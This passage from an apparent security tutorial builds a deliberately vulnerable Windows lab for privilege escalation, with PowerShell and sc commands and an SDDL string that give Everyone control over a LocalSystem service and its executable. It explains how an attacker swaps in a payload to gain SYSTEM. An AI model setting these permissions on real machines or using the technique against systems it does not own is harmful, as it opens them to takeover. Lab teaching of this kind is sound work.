</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Name</span>                             <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
</span></span><span class="line"><span class="cl"><span class="p">======================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">==================================================</span>
</span></span><span class="line"><span class="cl"><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>                 <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">544</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span><span class="p">,</span> <span class="nb">Group </span><span class="n">owner</span>
</span></span><span class="line"><span class="cl"><span class="n">Everyone</span>                               <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>       <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">System</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">16</span><span class="p">-</span><span class="mf">16384</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
</span></span><span class="line"><span class="cl"><span class="p">----------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Privilege</span> <span class="n">Name</span>                            <span class="n">Description</span>                                                        <span class="n">State</span>
</span></span><span class="line"><span class="cl"><span class="p">=========================================</span> <span class="p">==================================================================</span> <span class="p">========</span>
</span></span><span class="line"><span class="cl"><span class="n">SeAssignPrimaryTokenPrivilege</span>             <span class="n">Replace</span> <span class="n">a</span> <span class="k">process</span> <span class="n">level</span> <span class="n">token</span>                                      <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeLockMemoryPrivilege</span>                     <span class="n">Lock</span> <span class="n">pages</span> <span class="k">in</span> <span class="n">memory</span>                                               <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseQuotaPrivilege</span>                  <span class="n">Adjust</span> <span class="n">memory</span> <span class="n">quotas</span> <span class="k">for</span> <span class="n">a</span> <span class="k">process</span>                                 <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeTcbPrivilege</span>                            <span class="n">Act</span> <span class="n">as</span> <span class="n">part</span> <span class="n">of</span> <span class="n">the</span> <span class="n">operating</span> <span class="n">system</span>                                <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeSecurityPrivilege</span>                       <span class="n">Manage</span> <span class="n">auditing</span> <span class="n">and</span> <span class="n">security</span> <span class="n">log</span>                                   <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeTakeOwnershipPrivilege</span>                  <span class="n">Take</span> <span class="n">ownership</span> <span class="n">of</span> <span class="n">files</span> <span class="n">or</span> <span class="n">other</span> <span class="n">objects</span>                           <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeLoadDriverPrivilege</span>                     <span class="n">Load</span> <span class="n">and</span> <span class="n">unload</span> <span class="n">device</span> <span class="n">drivers</span>                                     <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeSystemProfilePrivilege</span>                  <span class="n">Profile</span> <span class="n">system</span> <span class="n">performance</span>                                         <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeSystemtimePrivilege</span>                     <span class="n">Change</span> <span class="n">the</span> <span class="n">system</span> <span class="n">time</span>                                             <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeProfileSingleProcessPrivilege</span>           <span class="n">Profile</span> <span class="n">single</span> <span class="k">process</span>                                             <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseBasePriorityPrivilege</span>           <span class="n">Increase</span> <span class="n">scheduling</span> <span class="n">priority</span>                                       <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeCreatePagefilePrivilege</span>                 <span class="n">Create</span> <span class="n">a</span> <span class="n">pagefile</span>                                                  <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeCreatePermanentPrivilege</span>                <span class="n">Create</span> <span class="n">permanent</span> <span class="n">shared</span> <span class="n">objects</span>                                    <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeBackupPrivilege</span>                         <span class="n">Back</span> <span class="n">up</span> <span class="n">files</span> <span class="n">and</span> <span class="n">directories</span>                                      <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeRestorePrivilege</span>                        <span class="n">Restore</span> <span class="n">files</span> <span class="n">and</span> <span class="n">directories</span>                                      <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeShutdownPrivilege</span>                       <span class="n">Shut</span> <span class="n">down</span> <span class="n">the</span> <span class="n">system</span>                                               <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeDebugPrivilege</span>                          <span class="n">Debug</span> <span class="n">programs</span>                                                     <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeAuditPrivilege</span>                          <span class="n">Generate</span> <span class="n">security</span> <span class="n">audits</span>                                           <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeSystemEnvironmentPrivilege</span>              <span class="n">Modify</span> <span class="n">firmware</span> <span class="n">environment</span> <span class="n">values</span>                                 <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeChangeNotifyPrivilege</span>                   <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>                                           <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeUndockPrivilege</span>                         <span class="n">Remove</span> <span class="n">computer</span> <span class="n">from</span> <span class="n">docking</span> <span class="n">station</span>                               <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeManageVolumePrivilege</span>                   <span class="n">Perform</span> <span class="n">volume</span> <span class="n">maintenance</span> <span class="n">tasks</span>                                   <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeImpersonatePrivilege</span>                    <span class="n">Impersonate</span> <span class="n">a</span> <span class="n">client</span> <span class="n">after</span> <span class="n">authentication</span>                          <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeCreateGlobalPrivilege</span>                   <span class="n">Create</span> <span class="n">global</span> <span class="n">objects</span>                                              <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseWorkingSetPrivilege</span>             <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span>                                    <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeTimeZonePrivilege</span>                       <span class="n">Change</span> <span class="n">the</span> <span class="n">time</span> <span class="n">zone</span>                                               <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeCreateSymbolicLinkPrivilege</span>             <span class="n">Create</span> <span class="n">symbolic</span> <span class="n">links</span>                                              <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeDelegateSessionUserImpersonatePrivilege</span> <span class="n">Obtain</span> <span class="n">an</span> <span class="n">impersonation</span> <span class="n">token</span> <span class="k">for</span> <span class="n">another</span> <span class="n">user</span> <span class="k">in</span> <span class="n">the</span> <span class="n">same</span> <span class="n">session</span> <span class="n">Enabled</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;re gonna delete this service from an <strong>administrator</strong> command prompt:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">delete</span> <span class="s2">&#34;Insecure VulnService Executable&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">DeleteService</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="defense">Defense</h2>
<p>Make sure that the executable permissions restrict a user from replacing it.</p>
<h1 id="privilege-escalation-via-insecure-service-permissions">Privilege Escalation via Insecure Service Permissions</h1>
<p>If our user has permission to change the configuration of a service that runs as LocalSystem (<code>NT AUTHORITY\SYSTEM</code>), we can replace the executable of the service with one of our own, this could something such as an implant, payload, or an encrypted payload. However, we must consider if we have privileges to stop/start or restart the service, if not we could try to see if we have the <code>SeShutdownPrivilege</code> token enabled so that we can restart the system. If not we will have to wait for an end user or an administrator to restart the system for us.</p>
<p>These are the most dangerous access rights that a service can have:</p>
<ul>
<li>SERVICE_START</li>
<li>SERVICE_STOP</li>
<li>SERVICE_CHANGE_CONFIG</li>
<li>SERVICE_ALL_ACCESS</li>
</ul>
<h2 id="configuration-1">Configuration</h2>
<p>Open an <strong>administrator</strong> command prompt or a PowerShell console as <strong>administrator</strong> and create the directory that we will use for the service path:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">md </span><span class="s2">&#34;C:\Program Files\Insecure DACL Service\&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Copy the service file to the path:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">copy </span><span class="s2">&#34;C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe&#34;</span> <span class="s2">&#34;C:\Program Files\Insecure DACL Service\VulnService.exe&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Grant full permissions to the executable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">icacls</span> <span class="s2">&#34;C:\Program Files\Insecure DACL Service\VulnService.exe&#34;</span> <span class="p">/</span><span class="n">grant</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span><span class="err">:</span><span class="n">F</span>
</span></span><span class="line"><span class="cl"><span class="n">processed</span> <span class="n">file</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">DACL</span> <span class="n">Service</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create the DACL service (command prompt as administrator):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">create</span> <span class="s2">&#34;DACL VulnService&#34;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;\&#34;</span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">DACL</span> <span class="n">Service</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="n">exe</span><span class="s2">&#34;&#34;</span> <span class="n">type</span><span class="p">=</span> <span class="n">own</span> <span class="n">displayname</span><span class="p">=</span> <span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">CreateService</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">DACL</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="s2">&#34;C:\Program Files\Insecure DACL Service\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">DACL</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: To create a quoted path we must add &ldquo;\ at the start of the <code>binpath</code> value. Example: &ldquo;&quot;C:\Path To\Executable&rdquo;&rdquo; or &ldquo;&quot;C:\Path To\Executable&rdquo;&quot;.</p>
<p>If we just add a value like &ldquo;C:\Path To\Executable&rdquo; then the service will be unquoted.</p>
</blockquote>
<p>Set the service access rights through the service&rsquo;s security descriptor which uses the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language" target="_blank" rel="noopener noreffer ">Service Descriptor Definition Language (SDDL)</a>. We&rsquo;re gonna use the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings" target="_blank" rel="noopener noreffer ">ACE Strings</a> to set the access rights which uses the following syntax:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ace_type</span><span class="p">;</span><span class="n">ace_flags</span><span class="p">;</span><span class="n">rights</span><span class="p">;</span><span class="n">object_guid</span><span class="p">;</span><span class="n">inherit_object_guid</span><span class="p">;</span><span class="n">account_sid</span><span class="p">;(</span><span class="n">resource_attribute</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Knowing this we&rsquo;re gonna set the access rights:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">sdset</span> <span class="s2">&#34;DACL VulnService&#34;</span> <span class="s2">&#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSWDC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">SetServiceObjectSecurity</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><em>What do all these ACE strings mean?</em></p>
<ul>
<li>S:  System Access Control List (SACL)</li>
<li>D: Discretionary ACL (DACL)</li>
</ul>
<p><em>The first letter after brackets means: allow (<strong>A</strong>) or deny (<strong>D</strong>).</em>*</p>
<p><em>The next set of symbols are assignable access rights.</em>*</p>
<ul>
<li>CC  SERVICE_QUERY_CONFIG</li>
<li>LC  SERVICE_QUERY_STATUS</li>
<li>SW SERVICE_ENUMERATE_DEPENDENTS</li>
<li>LO SERVICE_INTERROGATE</li>
<li>CR  SERVICE_USER_DEFINED_CONTROL</li>
<li>RC  READ_CONTROL</li>
<li>RP  SERVICE_START</li>
<li>WP SERVICE_STOP</li>
<li>DT  SERVICE_PAUSE_CONTINUE</li>
</ul>
<p><em>The last two characters are the objects (user, group, or SID) that are granted permissions. There is a list of predefined groups.</em>*</p>
<ul>
<li>AU Authenticated Users</li>
<li>AO Account operators</li>
<li>RU Alias to allow previous Windows 2000</li>
<li>AN Anonymous logon</li>
<li>AU Authenticated users</li>
<li>BA Built-in administrators</li>
<li>BG Built-in guests</li>
<li>BO Backup operators</li>
<li>BU Built-in users</li>
<li>CA Certificate server administrators</li>
<li>CG Creator group</li>
<li>CO Creator owner</li>
<li>DA Domain administrators</li>
<li>DC Domain computers</li>
<li>DD Domain controllers</li>
<li>DG Domain guests</li>
<li>DU Domain users</li>
<li>EA Enterprise administrators</li>
<li>ED Enterprise domain controllers</li>
<li>WD Everyone</li>
<li>PA Group Policy administrators</li>
<li>IU Interactively logged-on user</li>
<li>LA Local administrator</li>
<li>LG Local guest</li>
<li>LS Local service account</li>
<li>SY Local system</li>
<li>NU Network logon user</li>
<li>NO Network configuration operators</li>
<li>NS Network service account</li>
<li>PO Printer operators</li>
<li>PS Personal self</li>
<li>PU Power users</li>
<li>RS RAS servers group</li>
<li>RD Terminal server users</li>
<li>RE Replicator</li>
<li>RC Restricted code</li>
<li>SA Schema administrators</li>
<li>SO Server operators</li>
<li>SU Service logon user</li>
</ul>
<p>We can also convert an SDDL string to a custom object with:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nb">ConvertFrom-SddlString</span> <span class="s2">&#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSWDC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Owner</span>            <span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="nb">Group </span>           <span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="n">DiscretionaryAcl</span> <span class="err">:</span> <span class="p">{</span><span class="n">Everyone</span><span class="err">:</span> <span class="n">AccessAllowed</span> <span class="p">(</span><span class="n">CreateDirectories</span><span class="p">,</span> <span class="n">ExecuteKey</span><span class="p">,</span> <span class="n">GenericExecute</span><span class="p">,</span> <span class="n">GenericRead</span><span class="p">,</span> <span class="n">GenericWrite</span><span class="p">,</span> <span class="n">ListDirectory</span><span class="p">,</span> <span class="n">Read</span><span class="p">,</span> <span class="n">ReadAndExecute</span><span class="p">,</span> <span class="n">ReadAttributes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="n">ReadExtendedAttributes</span><span class="p">,</span> <span class="n">ReadPermissions</span><span class="p">,</span> <span class="n">Traverse</span><span class="p">,</span> <span class="n">WriteData</span><span class="p">,</span> <span class="n">WriteExtendedAttributes</span><span class="p">,</span> <span class="n">WriteKey</span><span class="p">),</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span><span class="err">:</span> <span class="n">AccessAllowed</span> <span class="p">(</span><span class="n">CreateDirectories</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="n">DeleteSubdirectoriesAndFiles</span><span class="p">,</span> <span class="n">ExecuteKey</span><span class="p">,</span> <span class="n">GenericExecute</span><span class="p">,</span> <span class="n">GenericRead</span><span class="p">,</span> <span class="n">GenericWrite</span><span class="p">,</span> <span class="n">ListDirectory</span><span class="p">,</span> <span class="n">Read</span><span class="p">,</span> <span class="n">ReadAndExecute</span><span class="p">,</span> <span class="n">ReadAttributes</span><span class="p">,</span> <span class="n">ReadExtendedAttributes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="n">ReadPermissions</span><span class="p">,</span> <span class="n">Traverse</span><span class="p">,</span> <span class="n">WriteAttributes</span><span class="p">,</span> <span class="n">WriteExtendedAttributes</span><span class="p">),</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span><span class="err">:</span> <span class="n">AccessAllowed</span> <span class="p">(</span><span class="n">ChangePermissions</span><span class="p">,</span> <span class="n">CreateDirectories</span><span class="p">,</span> <span class="n">Delete</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="n">DeleteSubdirectoriesAndFiles</span><span class="p">,</span> <span class="n">ExecuteKey</span><span class="p">,</span> <span class="n">FullControl</span><span class="p">,</span> <span class="n">GenericAll</span><span class="p">,</span> <span class="n">GenericExecute</span><span class="p">,</span> <span class="n">GenericRead</span><span class="p">,</span> <span class="n">GenericWrite</span><span class="p">,</span> <span class="n">ListDirectory</span><span class="p">,</span> <span class="n">Modify</span><span class="p">,</span> <span class="n">Read</span><span class="p">,</span> <span class="n">ReadAndExecute</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="n">ReadAttributes</span><span class="p">,</span> <span class="n">ReadExtendedAttributes</span><span class="p">,</span> <span class="n">ReadPermissions</span><span class="p">,</span> <span class="n">TakeOwnership</span><span class="p">,</span> <span class="n">Traverse</span><span class="p">,</span> <span class="n">Write</span><span class="p">,</span> <span class="n">WriteAttributes</span><span class="p">,</span> <span class="n">WriteData</span><span class="p">,</span> <span class="n">WriteExtendedAttributes</span><span class="p">,</span> <span class="n">WriteKey</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">SystemAcl</span>        <span class="err">:</span> <span class="p">{</span><span class="n">Everyone</span><span class="err">:</span> <span class="n">SystemAudit</span> <span class="n">FailedAccess</span> <span class="p">(</span><span class="n">ChangePermissions</span><span class="p">,</span> <span class="n">CreateDirectories</span><span class="p">,</span> <span class="n">Delete</span><span class="p">,</span> <span class="n">DeleteSubdirectoriesAndFiles</span><span class="p">,</span> <span class="n">ExecuteKey</span><span class="p">,</span> <span class="n">FullControl</span><span class="p">,</span> <span class="n">GenericAll</span><span class="p">,</span> <span class="n">GenericExecute</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="n">GenericRead</span><span class="p">,</span> <span class="n">GenericWrite</span><span class="p">,</span> <span class="n">ListDirectory</span><span class="p">,</span> <span class="n">Modify</span><span class="p">,</span> <span class="n">Read</span><span class="p">,</span> <span class="n">ReadAndExecute</span><span class="p">,</span> <span class="n">ReadAttributes</span><span class="p">,</span> <span class="n">ReadExtendedAttributes</span><span class="p">,</span> <span class="n">ReadPermissions</span><span class="p">,</span> <span class="n">TakeOwnership</span><span class="p">,</span> <span class="n">Traverse</span><span class="p">,</span> <span class="n">Write</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                   <span class="n">WriteAttributes</span><span class="p">,</span> <span class="n">WriteData</span><span class="p">,</span> <span class="n">WriteExtendedAttributes</span><span class="p">,</span> <span class="n">WriteKey</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">RawDescriptor</span>    <span class="err">:</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">AccessControl</span><span class="p">.</span><span class="py">CommonSecurityDescriptor</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: According to <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2" target="_blank" rel="noopener noreffer ">MSDN</a> the <code>ConvertFrom-SddlString</code> cmdlet converts a Security Descriptor Definition Language string to a custom <strong>PSCustomObject</strong> object with the following properties: Owner, Group, DiscretionaryAcl, SystemAcl and RawDescriptor.</p>
</blockquote>
<p>Alternatively, we can use PowerShell 7.2 to set an SDDL string:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SDDL</span> <span class="p">=</span> <span class="s2">&#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSWDC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&#34;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Set-Service</span> <span class="n">-Name</span> <span class="s2">&#34;DACL VulnService&#34;</span> <span class="n">-SecurityDescriptorSddl</span> <span class="nv">$SDDL</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Alternatively, we could also use the <a href="https://windows-resource-kit-tools-subinacl-exe.software.informer.com/" target="_blank" rel="noopener noreffer ">SubinACL</a> provided by the <a href="https://en.wikipedia.org/wiki/Resource_Kit" target="_blank" rel="noopener noreffer ">Windows Resource Toolkit</a>. SubInACL is a Microsoft command-line program for working with Windows security permissions. It allows us to change the permissions of files, folders, registry keys, services, printers, cluster shares, and a variety of other objects.</p>
<p>After we have downloaded and extracted Windows Resource Kit, we shall change to the directory:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">cd </span><span class="s2">&#34;C:\Program Files (x86)\Windows Resource Kits\Tools&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;re gonna give a user the access rights to suspend (pause/continue), start, and stop (restart) a service in this scenario.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
